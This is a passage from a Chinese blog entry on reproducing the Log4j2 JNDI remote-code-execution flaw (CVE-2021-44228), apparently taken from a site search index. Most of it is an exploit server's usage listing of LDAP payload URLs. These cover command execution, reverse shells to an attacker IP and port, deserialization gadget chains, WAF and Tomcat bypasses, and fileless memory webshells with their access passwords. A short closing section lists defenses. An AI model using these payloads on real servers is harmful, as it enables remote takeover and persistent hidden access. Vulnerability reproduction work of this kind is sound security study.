Queries：<br>* all words are case INSENSITIVE when send to ldap server<br><br>[+] Basic Queries: ldap://0.0.0.0:1389/Basic/[PayloadType]/[Params], e.g.<br>    ldap://0.0.0.0:1389/Basic/Dnslog/[domain]<br>    ldap://0.0.0.0:1389/Basic/Command/[cmd]<br>    ldap://0.0.0.0:1389/Basic/Command/Base64/[base64_encoded_cmd]<br>    ldap://0.0.0.0:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://0.0.0.0:1389/Basic/TomcatEcho<br>    ldap://0.0.0.0:1389/Basic/SpringEcho<br>    ldap://0.0.0.0:1389/Basic/WeblogicEcho<br>    ldap://0.0.0.0:1389/Basic/TomcatMemshell1<br>    ldap://0.0.0.0:1389/Basic/TomcatMemshell2  ---need extra header [shell: true]<br>    ldap://0.0.0.0:1389/Basic/JettyMemshell<br>    ldap://0.0.0.0:1389/Basic/WeblogicMemshell1<br>    ldap://0.0.0.0:1389/Basic/WeblogicMemshell2<br>    ldap://0.0.0.0:1389/Basic/JBossMemshell<br>    ldap://0.0.0.0:1389/Basic/WebsphereMemshell<br>    ldap://0.0.0.0:1389/Basic/SpringMemshell<br><br>[+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.<br>    ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]<br>    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]<br>    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]<br>    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho<br>    ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho<br>    ldap://0.0.0.0:1389/Deserialization/Jdk7u21/WeblogicEcho<br>    ldap://0.0.0.0:1389/Deserialization/Jre8u20/TomcatMemshell<br>    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1<br>    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells<br><br>[+] TomcatBypass Queries<br>    ldap://0.0.0.0:1389/TomcatBypass/Dnslog/[domain]<br>    ldap://0.0.0.0:1389/TomcatBypass/Command/[cmd]<br>    ldap://0.0.0.0:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]<br>    ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho<br>    ldap://0.0.0.0:1389/TomcatBypass/SpringEcho<br>    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell1<br>    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell2  ---need extra header [shell: true]<br>    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell3  /ateam  pass1024<br>    ldap://0.0.0.0:1389/TomcatBypass/SpringMemshell<br><br>[+] GroovyBypass Queries<br>    ldap://0.0.0.0:1389/GroovyBypass/Command/[cmd]<br>    ldap://0.0.0.0:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]<br><br>[+] WebsphereBypass Queries<br>    ldap://0.0.0.0:1389/WebsphereBypass/List/file=[file or directory]<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Dnslog/[domain]<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/[cmd]<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell<br>    ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp<br></code></pre></td></tr></table></figure><blockquote><p>&#x2F;Basic&#x2F;TomcatMemshell1   内存马，访问地址为：&#x2F;anything?type&#x3D;basic&amp;pass&#x3D;whoami</p><p>&#x2F;Basic&#x2F;TomcatMemshell2  的访问方式需要修改<code>冰蝎</code>客户端（请参考 <a href="https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ">冰蝎改造之适配基于tomcat Filter的无文件webshell</a> 的方式二自行修改），并在访问时需要添加 <code>X-Options-Ai</code> 头部，密码为<code>rebeyond</code></p></blockquote><h2 id="4-漏洞防御"><a href="#4-漏洞防御" class="headerlink" title="4.漏洞防御"></a>4.漏洞防御</h2><ol><li>采用waf对请求流量中的${jndi进行拦截（存在绕过）</li><li>采用 rasp 对lookup的调用进行阻断</li><li>设置 JVM 启动参数 - <code>Dlog4j2.formatMsgNoLookups=true</code>（log4j2版本2.10+）</li><li>更新组件log4j2 到2.15.0-rc2</li></ol>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
      <category>CVE-2021-44228</category>
      
    </categories>
    
    
    <tags>
      
      <tag>log4j2</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
